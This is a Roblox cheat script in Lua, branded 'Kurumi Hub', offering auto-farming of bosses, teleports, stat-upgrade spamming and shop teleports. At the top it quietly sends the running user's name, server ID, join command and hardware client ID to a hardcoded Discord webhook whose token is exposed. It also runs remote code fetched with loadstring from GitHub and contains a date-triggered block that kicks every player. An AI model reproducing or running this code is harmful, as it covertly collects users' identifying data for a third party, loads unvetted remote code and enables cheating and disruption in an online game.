for i,v in pairs(game.Players:GetPlayers()) do
	PlayersMin = i
end


JoinServer = 'game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId,'..'\''..tostring(game.JobId)..'\''..')'


local url = "https://discord.com/api/webhooks/1206388649994752090/AH_L6Cm3lOqGrqR4Md0vfD0NTCxvfvod8uNvTfvyGXH9043WwMOQEXFmrRHc2FSdITTl" -- ur webhook url
local data = {
	["username"] = 'Kurumi Hub', -- Webhook name here
	['content'] = '<@&1>', -- ping everyone if you want to ping role use this <@&1007291553074647132> 
	["avatar_url"] = "https://cdn.discordapp.com/attachments/1102162122990944316/1102558004009766942/Logo1.png", -- ur discord logo url
	["embeds"] = {
		{
			["description"] = "**__Moon and Mirage Webhook__**",
			["color"] = tonumber(0xff0000), -- color id		
			["type"] = "rich",
			["fields"] =  {
			  			{
			  				["name"] = "User Name",
			  				["value"] = '```'..tostring(game.Players.LocalPlayer.Name)..'```'
			  			},
				{
					["name"] = "[👥] Players Active",
					["value"] = '```'..tostring(PlayersMin)..'/12```'
				},
				{
					["name"] = "[📃] JobID",
					["value"] = '```'..tostring(game.JobId)..'```'
				},
				{
					["name"] = "[📁] Join Server",
					["value"] = '```'..JoinServer..'```',
				},
				{
					["name"] = "Hwid",
					["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
					["inline"] = true
				}
			},
			["footer"] = {
				["text"] = "Kurumi Hub", -- you can remove this but it will hurt
			},
			["timestamp"] = DateTime.now():ToIsoDate(),
		}
	},
}
local newdata = game:GetService("HttpService"):JSONEncode(data)
local headers = {["content-type"] = "application/json"}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)

--กำหนดเวลาเตะผู้ดล่นตามวันเดือนปี เวลาจริง

spawn(function()
        while wait() do
            pcall(function()
local targetYear = 2024 --ปี
local targetMonth = 2 -- เดือน
local targetDay = 22 --วัน
local targetHour = 0 --เวลา
local targetMinute = 0
local targetAM = true -- เดี๋ยวเเก้

game:GetService("RunService").Stepped:Connect(function()
    local currentTime = os.date("*t")
    
    if currentTime.year >= targetYear and currentTime.month >= targetMonth and currentTime.day >= targetDay then
        local currentHour = currentTime.hour
        if targetAM and currentHour >= targetHour and currentTime.min >= targetMinute and currentTime.sec >= 0 then
            for _, player in ipairs(game.Players:GetPlayers()) do
                player:Kick("Dick.")
            end
        elseif not targetAM and currentHour < 12 and currentHour >= targetHour and currentTime.min >= targetMinute and currentTime.sec >= 0 then
            for _, player in ipairs(game.Players:GetPlayers()) do
                player:Kick("Dick.")
            end
        end
    end
end)
end)
end
end)


local Library = loadstring(Game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/wizard"))()
local PhantomForcesWindow = Library:NewWindow("Stats")
local KillingCheats = PhantomForcesWindow:NewSection("Auto Stats")
KillingCheats:CreateToggle("Melee", function(value)
    _G.up1 = value
    print('up1: ', value);
    if value then
        up1();
    end
end)

function up1()
    spawn(function()
        _G.up1 = true
        while _G.up1 do wait()
        pcall(function()
            local args = {
                [1] = "Melee",
                [2] = 1
            }
            
            game:GetService("ReplicatedStorage").Remotes.UpStats:FireServer(unpack(args))
            wait()
        end)
    end
end)
end

KillingCheats:CreateToggle("Weapon", function(value)
    _G.up2 = value
    print('up2: ', value);
    if value then
        up2();
    end
end)

function up2()
    spawn(function()
        _G.up2 = true
        while _G.up2 do wait()
        pcall(function()
            local args = {
                [1] = "Weapon",
                [2] = 1
            }
            
            game:GetService("ReplicatedStorage").Remotes.UpStats:FireServer(unpack(args))
            wait()
        end)
    end
end)
end
KillingCheats:CreateToggle("Defense", function(value)
    _G.up3 = value
    print('up3: ', value);
    if value then
        up3();
    end
end)

function up3()
    spawn(function()
        _G.up3 = true
        while _G.up3 do wait()
        pcall(function()
            local args = {
                [1] = "Defense",
                [2] = 1
            }
            
            game:GetService("ReplicatedStorage").Remotes.UpStats:FireServer(unpack(args))
            wait()
        end)
    end
end)
end
KillingCheats:CreateToggle("DemonFruit", function(value)
    _G.up4 = value
    print('up4: ', value);
    if value then
        up4();
    end
end)

function up4()
    spawn(function()
        _G.up4 = true
        while _G.up4 do wait()
        pcall(function()
            local args = {
                [1] = "DemonFruit",
                [2] = 1
            }
            
            game:GetService("ReplicatedStorage").Remotes.UpStats:FireServer(unpack(args))
            wait()
        end)
    end
end)
end

    
    
    	local decalsyeeted = true -- Leaving this on makes games look shitty but the fps goes up by at least 20.
        	local g = game
        	local w = g.Workspace
        	local l = g.Lighting
        	local t = w.Terrain
        	t.WaterWaveSize = 0
        	t.WaterWaveSpeed = 0
        	t.WaterReflectance = 0
        	t.WaterTransparency = 0
        	l.GlobalShadows = false
        	l.FogEnd = 9e9
        	l.Brightness = 0
        	settings().Rendering.QualityLevel = "Level01"
        	for i, v in pairs(g:GetDescendants()) do
        		if v:IsA("Part") or v:IsA("Union") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
        			v.Material = "Plastic"
        			v.Reflectance = 0
        		elseif v:IsA("Decal") or v:IsA("Texture") and decalsyeeted then
        			v.Transparency = 1
        		elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
        			v.Lifetime = NumberRange.new(0)
        		elseif v:IsA("Explosion") then
        			v.BlastPressure = 1
        			v.BlastRadius = 1
        		elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") or v:IsA("Sparkles") then
        			v.Enabled = false
        		elseif v:IsA("MeshPart") then
        			v.Material = "Plastic"
        			v.Reflectance = 0
        			v.TextureID = 10385902758728957
        		end
        	end
        	for i, e in pairs(l:GetChildren()) do
        		if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then
        			e.Enabled = false
        		end
        	end

function No()
for i, v in ipairs(workspace.Lives:GetChildren()) do
    if not game:GetService("Players"):GetPlayerFromCharacter(v) then -- if not player then
        local cleanedName = string.gsub(v.Name, "%d+$", "")
        v.Name = tostring(cleanedName)
    end
end

workspace.Lives.ChildAdded:Connect(function(model)
task.wait()
if not game:GetService("Players"):GetPlayerFromCharacter(model) then -- if not player then
        local cleanedName = string.gsub(model.Name, "%d+$", "")
        model.Name = cleanedName
        end
    end)
end

No()

local Players = assert(assert(game, "game missing?"):FindService("Players") or game:GetService("Players"), "Players missing?")
local LocalPlayer = assert(Players.LocalPlayer, "LocalPlayer missing?")
local replaces_str = {Players.LocalPlayer.Name}
                 
print(Players.LocalPlayer.Name)

function TPCHEST()
pcall(function()
for i,v in pairs(game:GetService("Workspace").Chests:GetDescendants()) do
if v.ClassName == "ProximityPrompt" then
fireproximityprompt(v,30)
game.Players.LocalPlayer.Character.HumanoidRootPart .CFrame = v.Parent.CFrame
end
end
end)
end

--[[

-- [Body Gyro]£
   spawn(function()
			while task.wait() do
				pcall(function()
					if _G.FarmSelect or _G.AutoFBoss or _G.AutoFGEMV1 then
						if not game:GetService("Players").LocalPlayer.Character.HumanoidRootPart:FindFirstChild("BodyClip") then
							local Noclip = Instance.new("BodyVelocity")
							Noclip.Name = "BodyClip"
							Noclip.Parent = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
							Noclip.MaxForce = Vector3.new(100000,100000,100000)
							Noclip.Velocity = Vector3.new(0,0,0)
						end
					else
						game:GetService("Players").LocalPlayer.Character.HumanoidRootPart:FindFirstChild("BodyClip"):Destroy()
					end
				end)
			end
   end)
	

	
--No CLip Auto Farm
spawn(function()
  pcall(function()
    game:GetService("RunService").Stepped:Connect(function()
      if _G.FarmSelect or _G.AutoFBoss or _G.AutoFGEMV1 then
      for i,v in pairs(game:GetService("Players").LocalPlayer.Character:GetDescendants()) do
      if v:IsA("BasePart") then
      v.CanCollide = false
      end
      end
      end
      end)
    end)
  end)
]]

--select weapon
    function EquipWeapon(ToolSe)
        if not _G.NotAutoEquip then
            if game.Players.LocalPlayer.Backpack:FindFirstChild(ToolSe) then
                Tool = game.Players.LocalPlayer.Backpack:FindFirstChild(ToolSe)
                wait(.1)
                game.Players.LocalPlayer.Character.Humanoid:EquipTool(Tool)
            end
        end
    end

function click()
        vu = game:GetService("VirtualUser")
        vu:ClickButton1(Vector2.new(250, 250))
end


--[[
      	       spawn(function()
    	              while wait() do
    	                  pcall(function()
    	                     	  if _G.AutoFBoss then
				for i, v in pairs(game:GetService("Workspace").Lives:GetChildren()) do
      	            if v.Humanoid.DisplayName == "Gojo [LV.2500]" or v.Humanoid.DisplayName == "Uraume [LV.7500]" or v.Humanoid.DisplayName == "Sukuna [LV.2500]" or v.Humanoid.DisplayName == "Kashimo [LV.3250]" or v.Humanoid.DisplayName == "Artoria [LV.3750]" or v.Humanoid.DisplayName == "Gojo [Unleashed] [LV.6500]" or v.Humanoid.DisplayName == "Rimuru [LV.6250]" or v.Humanoid.DisplayName == "Shank [LV.2500]" or v.Humanoid.DisplayName == "Sand Man [LV.2000]" or v.Humanoid.DisplayName == "Bomb Man [LV.1500]" or v.Humanoid.DisplayName == "Snow Bandit Leader [LV.2350]" then
        if v.Humanoid.Health > 0 then
          
    	                                  repeat task.wait()
    	                                      if _G.Method == "Behind" then
    	                                          MethodFarm = CFrame.new(0,0,_G.Distance) * CFrame.Angles(math.rad(0),0,0)
    	                                      elseif _G.Method == "Front" then
    	                                          MethodFarm = CFrame.new(0,0,-_G.Distance) * CFrame.Angles(math.rad(0),0,-90)
    	                                      elseif _G.Method == "Under" then
    	                                          MethodFarm = CFrame.new(0,-_G.Distance,0) * CFrame.Angles(math.rad(90),0,0)
    	                                      elseif _G.Method == "Over" then
    	                                          MethodFarm = CFrame.new(0,_G.Distance,1.2)  * CFrame.Angles(math.rad(-90),0,0)
    	                                      else
    	                                          MethodFarm = CFrame.new(0,0,_G.Distance)
    	                                      end
    	                                      TPCHEST()
    	                                      EquipWeapon(ChooseWeapon)
    	                                      game:GetService("TweenService"):Create(game.Players.LocalPlayer.Character.HumanoidRootPart,TweenInfo.new((v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude/tonumber(_G.TWSpeed), Enum.EasingStyle.Linear),{CFrame = v.HumanoidRootPart.CFrame * MethodFarm or CFrame.new(0,0,_G.Distance)}):Play()
    	                                      click()
    	                                  until _G.AutoFBoss == false or v.Humanoid.Health <= 0
    	                              end
      	            end
end
        	               	               	                   end
        	               	               	               end)
        	               	               	           end
        	       end)
]]

function TP(P)
    Distance = (P.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
    if Distance < 150 then
        Speed = 10000
    else
      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = P
      end
    game:GetService("TweenService"):Create(
        game.Players.LocalPlayer.Character.HumanoidRootPart,
        TweenInfo.new(Distance/Speed, Enum.EasingStyle.Linear),
        {CFrame = P}
    ):Play()
end

--[[

spawn(function()
  while wait() do
    pcall(function()
        if _G.AutoFBoss then
    for _, v in pairs(game:GetService("Workspace").Lives:GetChildren()) do
              	            if v.Humanoid.DisplayName == "Sukuna [Half Power] [LV.7500]" or v.Humanoid.DisplayName == "Gojo [LV.2500]" or v.Humanoid.DisplayName == "Uraume [LV.7500]" or v.Humanoid.DisplayName == "Sukuna [LV.2500]" or v.Humanoid.DisplayName == "Kashimo [LV.3250]" or v.Humanoid.DisplayName == "Artoria [LV.3750]" or v.Humanoid.DisplayName == "Gojo [Unleashed] [LV.6500]" or v.Humanoid.DisplayName == "Rimuru [LV.6250]" or v.Humanoid.DisplayName == "Shank [LV.2500]" or v.Humanoid.DisplayName == "Sand Man [LV.2000]" or v.Humanoid.DisplayName == "Bomb Man [LV.1500]" or v.Humanoid.DisplayName == "Snow Bandit Leader [LV.2350]" then
                  if v.Humanoid.Health > 0 then
          repeat task.wait()
EquipWeapon(ChooseWeapon)
            TP(v.HumanoidRootPart.CFrame * CFrame.new(0,_G.Distance,0) * CFrame.Angles(math.rad(-90),0,0))
            click()
            TPCHEST()
          until _G.AutoFBoss == false or v.Humanoid.Health <= 0
                  end
end
        end
    end
    end)
end
end)


]]


spawn(function()
  while wait() do
    pcall(function()
        if _G.AutoFBoss then
    for _, v in pairs(game:GetService("Workspace").Lives:GetChildren()) do
              	            if v.Humanoid.DisplayName == "Sukuna [Half Power] [LV.7500]" or v.Humanoid.DisplayName == "Gojo [LV.2500]" or v.Humanoid.DisplayName == "Uraume [LV.7500]" or v.Humanoid.DisplayName == "Sukuna [LV.2500]" or v.Humanoid.DisplayName == "Kashimo [LV.3250]" or v.Humanoid.DisplayName == "Artoria [LV.3750]" or v.Humanoid.DisplayName == "Gojo [Unleashed] [LV.6500]" or v.Humanoid.DisplayName == "Rimuru [LV.6250]" or v.Humanoid.DisplayName == "Shank [LV.2500]" or v.Humanoid.DisplayName == "Sand Man [LV.2000]" or v.Humanoid.DisplayName == "Bomb Man [LV.1500]" or v.Humanoid.DisplayName == "Snow Bandit Leader [LV.2350]" then
                  if v.Humanoid.Health > 0 then
          repeat task.wait()
EquipWeapon(ChooseWeapon)
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =  v.HumanoidRootPart.CFrame*CFrame.new(0,_G.Distance,0)*CFrame.Angles(math.rad(-90),0,0)
            click()
            TPCHEST()
          until _G.AutoFBoss == false or v.Humanoid.Health <= 0
                  end
end
    end
      end
    end)
end
end)




_G.Distance = 4
_G.TWSpeed = 5000

local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()

local Window = Fluent:CreateWindow({
    Title = "Kurumi | Hub  " .."Executor ".. tostring(identifyexecutor()),
    SubTitle = "Script Made Kurumi",
    TabWidth = 160,
    Size = UDim2.fromOffset(580, 460),
    Acrylic = true, -- The blur may be detectable, setting this to false disables blur entirely
    Theme = "Dark",
    MinimizeKey = Enum.KeyCode.LeftControl -- Used when theres no MinimizeKeybind
})

--Fluent provides Lucide Icons https://lucide.dev/icons/ for the tabs, icons are optional
local Tabs = {
        Farm = Window:AddTab({ Title = "Farm", Icon = "sword" }),
}

local FarmSettings = Tabs.Farm:AddSection("Farm Settings")
  
  --[[
        local Mobs = {}
        local MobDP = FarmSettings:AddDropdown("MultiDropdown", {
        Title = "Select Mobs",
        Description = "You can select multiple values.",
        Values = Mobs,
        Multi = true,
        Default = {Mobs[1]},
        Callback = function(M)
          
      _G.MobSCP = M
  end
    })
]]


FarmSettings:AddParagraph({
        Title = "There's a bug, if you have a secret Weapons to switch Melee or with and come back and press what you will use ",
        Content = "ถ้าเปลี่ยนอาวุธใหม่ ให้กด สลับที่เลือกอาวุธละกดกลับมาสิ่งที่จะใช้"
    })
  
FarmSettings:AddDropdown("Weapon", {
        Title = "Select Sword",
        Values = {"Sword" , "Melee"},
        Multi = false,
        Default = 1,
        Callback = function(Value)
  ChooseWeapon = Value
      end
    })
    task.spawn(function()
        while wait() do
            pcall(function()
                if ChooseWeapon == "Melee" then
                    for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                        if v.Name ==   "Combat" or v.Name == "Sukuna" or v.Name ==  "Gojo" or v.Name == "Gon" or v.Name ==   "Itadori" or v.Name ==   "Uraume" or v.Name ==   "Hakari" or v.Name ==  "Sukuna [Half Power]" or v.Name ==  "Killua" then
                            if game.Players.LocalPlayer.Backpack:FindFirstChild(tostring(v.Name)) then
                                ChooseWeapon = v.Name
                            end
                        end
                    end
                elseif ChooseWeapon == "Sword" then
                    for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                        if v.Name ==   "Saber" or v.Name ==  "Excalibur" or v.Name ==  "Cutlass" or v.Name ==   "Katana" or v.Name ==  "Yoru" or v.Name ==  "Kashimo's Pole Curse" or v.Name ==  "Cid's Sword" or v.Name ==  "Kashimo's Pole" or v.Name ==  "Rimuru's Sword" then
                            if game.Players.LocalPlayer.Backpack:FindFirstChild(tostring(v.Name)) then
                                ChooseWeapon = v.Name
                            end
                        end
                    end
end
end)
end 
end)
   --[[
FarmSettings:AddDropdown("Dropdown", {
        Title = "Select Mode",
        Values = {"Under", "Over", "Behind"},
        Multi = false,
        Default = 1,
        Callback = function(v)
          _G.Method = v
        end
    })
]]
FarmSettings:AddInput("Input", {
        Title = "Distance",
        Default = 5,
        Placeholder = "Insert Distance",
        Numeric = true, -- Only allows numbers
        Finished = false, -- Only calls callback when you press enter
        Callback = function(Text)
            _G.Distance = Text
        end
    })

FarmSettings:AddToggle("enablefarm", {
    Title = "Auto Farm Boss + Gem", 
    Default = false, 
    Callback = function(GEMV1) 
    _G.AutoFBoss = GEMV1
end 
})

FarmSettings:AddToggle("enablefarm", {
    Title = "WhiteScreen", 
    Default = false, 
    Callback = function(value) 
    _G.WhiteScreen = value
if _G.WhiteScreen == true then
    game:GetService("RunService"):Set3dRenderingEnabled(false)
elseif _G.WhiteScreen == false then
    game:GetService("RunService"):Set3dRenderingEnabled(true)
end
end 
})

local IVN = {
        IVNTR = Window:AddTab({ Title = "Inventory", Icon = "scroll" }),
}

local Inventory = IVN.IVNTR:AddSection("Item Inventory ")

local DemonLordSwordCheck = Inventory:AddParagraph({
        Title = "Demon Lord Sword",
        Content = "Status : "
    })
    
    spawn(function()
                    while wait() do
                        pcall(function()
                          local Rimuru = 0
                            for _,v in pairs(game.Players[Players.LocalPlayer.Name].Backpack:GetChildren()) do
                                          if v.Name == "Demon Lord's Sword" then
                                              Rimuru = Rimuru + 1
DemonLordSwordCheck:SetDesc("Demon Lord Sword : "..(Rimuru))
else
  DemonLordSwordCheck:SetDesc("Demon Lord Sword : "..(Rimuru))
end
end
end)

end
end)



local DiamondCardCheck = Inventory:AddParagraph({
Title = "Diamond Card",
Content = "Status : "
})
    
spawn(function()
                            while wait() do
                                pcall(function()
                                  local Diamond = 0
                                    for _,v in pairs(game.Players[Players.LocalPlayer.Name].Backpack:GetChildren()) do
                                                  if v.Name == "Diamond Card" then
                                                      Diamond = Diamond + 1
            DiamondCardCheck:SetDesc("Diamond Card : "..(Diamond))
            else
              DiamondCardCheck:SetDesc("Diamond Card : "..(Diamond))
            end
end
end)
end
end)

local ClubCardCheck = Inventory:AddParagraph({
Title = "Club Card",
Content = "Status : "
})
    
spawn(function()
                            while wait() do
                                pcall(function()
                                  local Club = 0
for _,v in pairs(game.Players[Players.LocalPlayer.Name].Backpack:GetChildren()) do
if v.Name == "Club Card" then
Club = Club + 1
            ClubCardCheck:SetDesc("Club Card : "..(Club))
            else
              ClubCardCheck:SetDesc("Club Card : "..(Club))
            end
end
end)
end
end)

local HeartCheck = Inventory:AddParagraph({
Title = "Heart Card",
Content = "Status : "
})
    
spawn(function()
                            while wait() do
                                pcall(function()
                                  local Heart = 0
                            for _,v in pairs(game.Players[Players.LocalPlayer.Name].Backpack:GetChildren()) do
                                          if v.Name == "Heart Card" then
                                              Heart = Heart + 1
            HeartCheck:SetDesc("Heart Card : "..(Heart))
            else
              HeartCheck:SetDesc("Heart Card : "..(Heart))
            end
end
end)
end
end)

local FishingCheck = Inventory:AddParagraph({
Title = "Fishing Rod",
Content = "Status : "
  
})
    
spawn(function()
        while wait() do
            pcall(function()
  local Fishing = 0
for _,v in pairs(game.Players[Players.LocalPlayer.Name].Backpack:GetChildren()) do
if v.Name == "Fishing Rod" then
       Fishing = Fishing + 1
            FishingCheck:SetDesc("Fishing Rod  : "..(Fishing))
            else
              FishingCheck:SetDesc("Fishing Rod  : "..(Fishing))
end
end
end)

end
end)



local HolyCheck = Inventory:AddParagraph({
Title = "Holy Grail",
Content = "Status : "
  
})
    
spawn(function()
while wait() do
pcall(function()
local Holy = 0
for _,v in pairs(game.Players[Players.LocalPlayer.Name].Backpack:GetChildren()) do
if v.Name == "Holy Grail" then
Holy = Holy + 1
HolyCheck:SetDesc("Holy Grail : "..(Holy))
            else
HolyCheck:SetDesc("Holy Grail : "..(Holy))
end
end
end)
end
end)

local SukunaFingerCheck = Inventory:AddParagraph({
Title = "Check Sukuna Finger",
Content = "Status : "
  
})
    
spawn(function()
        while wait() do
            pcall(function()
  local FingerCheck = 0
for _,v in pairs(game.Players[Players.LocalPlayer.Name].Backpack:GetChildren()) do
if v.Name == "Sukuna Finger" then
FingerCheck = FingerCheck + 1
            SukunaFingerCheck:SetDesc("Sukuna Finger  : "..(FingerCheck))
            else
              SukunaFingerCheck:SetDesc("Sukuna Finger  : "..(FingerCheck))
end
end
end)
end
end)


local InfinityOrbCheck = Inventory:AddParagraph({
Title = "Infinity Orb",
Content = "Status : "
  
})
    
spawn(function()
        while wait() do
            pcall(function()
local InfinityCheck = 0
for _,v in pairs(game.Players[Players.LocalPlayer.Name].Backpack:GetChildren()) do
if v.Name == "Infinity Orb" then
InfinityCheck = InfinityCheck + 1
            InfinityOrbCheck:SetDesc("Infinity Orb  : "..(InfinityCheck))
            else
              InfinityOrbCheck:SetDesc("Infinity Orb  : "..(InfinityCheck))
end
end
end)
end
end)



local LightningorbCheck = Inventory:AddParagraph({
Title = "Lightning Orb",
Content = "Status : "
  
})
    
spawn(function()
        while wait() do
            pcall(function()
local LightningCheck = 0
for _,v in pairs(game.Players[Players.LocalPlayer.Name].Backpack:GetChildren()) do
if v.Name == "Lightning Orb" then
LightningCheck = LightningCheck + 1
            LightningorbCheck:SetDesc("Lightning Orb  : "..(LightningCheck))
            else
              LightningorbCheck:SetDesc("Lightning Orb  : "..(LightningCheck))
end
end
end)
end
end)


local HakiColorCheck = Inventory:AddParagraph({
Title = "Haki Color Reroll",
Content = "Status : "
})
    
spawn(function()
        while wait() do
            pcall(function()
local HakiColorheck  = 0
for _,v in pairs(game.Players[Players.LocalPlayer.Name].Backpack:GetChildren()) do
if v.Name == "Haki Color Reroll" then
HakiColorheck = HakiColorheck + 1
            HakiColorCheck:SetDesc("Haki Color Reroll  : "..(HakiColorheck))
            else
              HakiColorCheck:SetDesc("Haki Color Reroll  : "..(HakiColorheck))
end
end
end)
end
end)


local KenbunshokuCheck = Inventory:AddParagraph({
Title = "Kenbunshoku Haki Book",
Content = "Status : "
})
    
spawn(function()
        while wait() do
            pcall(function()
local Haki  = 0
                            for _,v in pairs(game.Players[Players.LocalPlayer.Name].Backpack:GetChildren()) do
                                          if v.Name == "Kenbunshoku Haki Book" then
                                              Haki = Haki + 1
            KenbunshokuCheck:SetDesc("Kenbunshoku Haki Book  : "..(Haki))
            else
              KenbunshokuCheck:SetDesc("Kenbunshoku Haki Book  : "..(Haki))
end
end
end)
end
end)

local Boss = {
        BossF = Window:AddTab({ Title = "Boss", Icon = "scroll" }),
}

local BossFarn = Boss.BossF:AddSection("Boss Check")

    local StatusRimuru = BossFarn:AddParagraph({
        Title = "Check Rimuru", -- Title > SetTitle
        Content = "Status: "   --Content > SetDesc
    })
    
    spawn(function()
        while wait() do
            pcall(function()
             if game:GetService("Workspace").Lives:FindFirstChild("Rimuru") then
                   StatusRimuru:SetTitle("Rimuru : ✅")
                    StatusRimuru:SetDesc("Rimuru : "..(workspace.Lives.Rimuru.Humanoid.Health))
                else
                  StatusRimuru:SetTitle("Rimuru : ❌")
                    StatusRimuru:SetDesc("Rimuru : ❌")
                end
end)
end
end)

    local StatusSukuna = BossFarn:AddParagraph({
        Title = "Check Sukuna",
        Content = "Status: "
    })
    
    spawn(function()
        while wait() do
            pcall(function()
             if game:GetService("Workspace").Lives:FindFirstChild("Sukuna") then
                   StatusSukuna:SetTitle("Sukuna : ✅")
                    StatusSukuna:SetDesc("Sukuna : "..(workspace.Lives.Sukuna.Humanoid.Health))
                else
                  StatusSukuna:SetTitle("Sukuna : ❌")
                    StatusSukuna:SetDesc("Sukuna : ❌")
                end
end)
end
end)

    local StatusGojo = BossFarn:AddParagraph({
        Title = "Check Gojo",
        Content = "Status: "
    })
    
    spawn(function()
        while wait() do
            pcall(function()
             if game:GetService("Workspace").Lives:FindFirstChild("Gojo") then
                   StatusGojo:SetTitle("Gojo : ✅")
                    StatusGojo:SetDesc("Gojo : "..(workspace.Lives.Gojo.Humanoid.Health))
                else
                  StatusGojo:SetTitle("Gojo : ❌")
                    StatusGojo:SetDesc("Gojo : ❌")
                end
end)
end
end)

    local StatusUraume = BossFarn:AddParagraph({
        Title = "Check Uraume",
        Content = "Status: "
    })
    
    spawn(function()
        while wait() do
            pcall(function()
             if game:GetService("Workspace").Lives:FindFirstChild("Uraume") then
                   StatusUraume:SetTitle("Uraume : ✅")
                    StatusUraume:SetDesc("Uraume : "..(workspace.Lives.Uraume.Humanoid.Health))
                else
                  StatusUraume:SetTitle("Uraume : ❌")
                    StatusUraume:SetDesc("Uraume : ❌")
                end
end)
end
end)

    local StatusArtoria = BossFarn:AddParagraph({
        Title = "Check Artoria",
        Content = "Status: "
    })
    
    spawn(function()
        while wait() do
            pcall(function()
             if game:GetService("Workspace").Lives:FindFirstChild("Artoria") then
                   StatusArtoria:SetTitle("Artoria : ✅")
                    StatusArtoria:SetDesc("Artoria : "..(workspace.Lives.Artoria.Humanoid.Health))
                else
                  StatusArtoria:SetTitle("Artoria : ❌")
                    StatusArtoria:SetDesc("Artoria : ❌")
                end
end)
end
end)

    local StatusKashimo = BossFarn:AddParagraph({
        Title = "Check Kashimo",
        Content = "Status: "
    })
    
    spawn(function()
        while wait() do
            pcall(function()
             if game:GetService("Workspace").Lives:FindFirstChild("Kashimo") then
                   StatusKashimo:SetTitle("Kashimo : ✅")
                    StatusKashimo:SetDesc("Kashimo : "..(workspace.Lives.Kashimo.Humanoid.Health))
                else
                  StatusKashimo:SetTitle("Kashimo : ❌")
                    StatusKashimo:SetDesc("Kashimo : ❌")
                end
end)
end
end)

local STS = {
        STA = Window:AddTab({ Title = "Auto UpStats Not Work", Icon = "scroll" }),
}

local Status = STS.STA:AddSection("Auto UpStats")

Status:AddDropdown("Dropdown", {
        Title = "Select Mode",
        Values = {"Melee", "Weapon", "Defense" ,"DemonFruit"},
        Multi = false,
        Default = 1,
        Callback = function(v)
          _G.MWDDF = v
        end
    })

Status:AddDropdown("Dropdown", {
        Title = "Select Mode",
        Values = {"1", "100", "1000"},
        Multi = false,
        Default = 1,
        Callback = function(v)
          _G.Nunber = v
        end
    })

Status:AddToggle("enablefarm", {
    Title = "Auto Up Status", 
    Default = false, 
    Callback = function(GEMV1) 
    _G.Melee = GEMV1
end 
})

    spawn(function()
        while wait() do 
        pcall(function()
          if _G.Melee then
game:GetService("ReplicatedStorage").Remotes.UpStats:FireServer( _G.MWDDF,_G.Nunber)
            end
        end)
    end
end)

local Npc = {
        NpcShop = Window:AddTab({ Title = "Shop", Icon = "scroll" }),
        Settings = Window:AddTab({ Title = "Settings", Icon = "settings" })
}

local NpcShopTP = Npc.NpcShop:AddSection("BossFarn")

NpcShopTP:AddDropdown("Select Fruit", {
        Title = "Select Gruit",
        Values = {"Quake Fruit", "God Light Fruit", "Dark Flame Fruit"},
        Multi = false,
        Default = 1,
        Callback = function(v)
          _G.FruitSelect = v
        end
    })
  
 NpcShopTP:AddToggle("Auto Random Fruit Select", {
    Title = "Auto Random Fruit Select", 
    Default = false, 
    Callback = function(v) 
    _G.FruitRD = v
end 
})

spawn(function()
      	              while wait() do
      	                  pcall(function()
      	                    if _G.FruitRD then
for i,v in pairs(game:GetService("Workspace").Shop:GetDescendants()) do
if v.ClassName == "ProximityPrompt" then
fireproximityprompt(v,30)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-741.048889, 43.4787788, -1933.82019, -0.0251465552, 7.8026531e-08, 0.999683797, -1.09866749e-09, 1, -7.80788483e-08, -0.999683797, -3.06173398e-09, -0.0251465552)
 if game.Players.LocalPlayer.Backpack:FindFirstChild(tostring(_G.FruitSelect)) then
   break
end
end
end
end
end)
end
end)

NpcShopTP:AddButton({
       Title = "[Katana] [2500$]",
       Callback = function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-909.817078, 35.2999916, -517.520386, -0.997258246, -5.08231457e-09, 0.0739996061, -5.64554181e-09, 1, -7.40204875e-09, -0.0739996061, -7.79952192e-09, -0.997258246)
end
   })

NpcShopTP:AddButton({
       Title = "[Yoru] [5000000$]",
       Callback = function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1853.85852, 69.9719696, 32.3987617, -0.0491525866, -1.44003263e-08, 0.998791277, -3.93964825e-08, 1, 1.24789707e-08, -0.998791277, -3.87354895e-08, -0.0491525866)
end
   })

NpcShopTP:AddButton({
       Title = "[Sukuna] [Require : 5 Sukuna Finger] [2500 Gem]",
       Callback = function()
         game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-917.713013, 34.5999947, -488.171783, 0.999844313, -2.79001942e-08, -0.0176440775, 2.8142022e-08, 1, 1.34576252e-08, 0.0176440775, -1.39520706e-08, 0.999844313)
end
   })

NpcShopTP:AddButton({
       Title = "[Executioner] [Require : ???] [Disabled]",
       Callback = function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1658.28516, 102.659988, -97.4339905, 0.39779678, 6.67110953e-08, 0.917473555, -8.14363865e-09, 1, -6.91808353e-08, -0.917473555, 2.00483399e-08, 0.39779678)
end
   })

NpcShopTP:AddButton({
       Title = "[Random Demon Fruit] [100 Gem]",
       Callback = function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-744.417419, 43.4787788, -1936.01074, 0.99731791, 2.50135539e-08, -0.0731918216, -2.87462889e-08, 1, -4.99459212e-08, 0.0731918216, 5.19159542e-08, 0.99731791)
end
   })

